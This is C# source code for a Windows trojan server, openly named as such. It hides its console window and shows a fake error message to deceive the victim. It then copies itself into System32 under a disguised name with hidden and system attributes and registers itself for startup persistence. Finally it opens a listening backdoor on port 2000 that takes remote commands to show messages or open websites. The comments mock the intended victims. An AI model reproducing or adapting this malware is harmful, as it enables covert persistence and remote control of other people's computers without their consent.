﻿using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.IO;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Shockwave_Trojan_Server
{
    class Program
    {

        public static NetworkStream Receiver;

        [DllImport("kernel32.dll")]

        public static extern bool FreeConsole();

        //We'll run this on another thread so the CPU doesn't go haywire.

        public static void Receive()
        {
            //Infinite loop

            while (true)
            {

                //Try to read the data.

                try

                {
                    //Packet of the received data

                    byte[] RecPacket = new byte[1000];

                    //Read a command from the client.

                    Receiver.Read(RecPacket, 0, RecPacket.Length);

                    //Flush the receiver

                    Receiver.Flush();

                    //Convert the packet into a readable string

                    string Command = Encoding.ASCII.GetString(RecPacket);

                    //Split the command into two different strings based on the splitter we made, !!!---

                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, "!!!---");

                    //Get the actual command.

                    Command = CommandArray[0];

                    //A switch which does a certain thing based on the received command

                    switch (Command)
                    {

                        //Code for "MESSAGE"

                        case "MESSAGE":

                            //Get the message.

                            string Msg = CommandArray[1];

                            //Display the message in a messagebox (the trim removes any excess data received :D)

                            System.Windows.Forms.MessageBox.Show(Msg.Trim('\0'));

                            break;

                        case "OPENSITE":

                            //Get the website URL

                            string Site = CommandArray[1];

                            //Open the site using Internet Explorer

                            System.Diagnostics.Process IE = new System.Diagnostics.Process();

                            IE.StartInfo.FileName = "iexplore.exe";

                            IE.StartInfo.Arguments = Site.Trim('\0');

                            IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;

                            IE.Start();

                            break;
                    }

                }
                catch
                {

                    //Stop reading data and close

                    break;
                }

            }
        }

        public static bool CheckIfRan()
        {
            //Let me know whether its in startup or not
            bool IsRan = false;
            //Check if the trojan exists in System32 using Environment.SpecialFolders for accurate folder opening;-)
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"))
            {
                //File exists, but is it in the registry? Lets open the Startup registry folder and take a peek :-)
                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                //If "logonassist" exists in startup
                if (k.GetValue("logonassist") != null)
                {
                    //Its in startup successfully
                    IsRan = true;
                }
                else
                {
                    IsRan = false;
                }
            }
            return IsRan;
        }

        //Function to add trojan to startup (YES, THIS IS ALL TAKEN FROM MY MALWARE TUT B/C I'M TOO LAZY TO REWRITE!

        public static void AddToStartup()
        {
            //Attemp to Copy the trojan to System32 with the name logonassistant.exe (its pretty complicated b/c its a console app and you can't use Application.ExecutablePath so I had to use Reflection to get the location and convert it to a string.

            try
            {
                File.Copy(Convert.ToString(System.Reflection.Assembly.GetExecutingAssembly().Location), Convert.ToString(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"), true);

                //Makes the trojan a hidden, read-only, system file :-)

                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.Hidden);

                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.System);

                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.ReadOnly);

                //Open startup and add trojan to startup and close registry (use try...catch in case registry editing is disabled for the current user)

                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

                //First argument is the name of the key, second is location of file, third is registryvalue of String

                k.SetValue("logonassist", Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", RegistryValueKind.String);

                k.Close();

            }

            catch

            {

                //Couldn't add to startup, but who cares? We'll still fuck them up :-)

            }
        }
        static void Main(string[] args)

        {

            //Hide console

            FreeConsole();

            //Check if the program has been ran.

            bool Check = CheckIfRan();

            //If it hasn't

            if (!Check)

            {

                //Display fake error and add to startup

                System.Windows.Forms.MessageBox.Show("This program is not a valid win32 application!", "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);

                AddToStartup();

                //Listen for client connection

                TcpListener l = new TcpListener(2000);

                l.Start();

                //Wait for client to connect, then make a TcpClient to accept the connection

                TcpClient Connection = l.AcceptTcpClient();

                //Get Connection's stream.

                Receiver = Connection.GetStream();

                //Start the receive commands thread

                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Receive));

                Rec.Start();
            }

        }
    }
}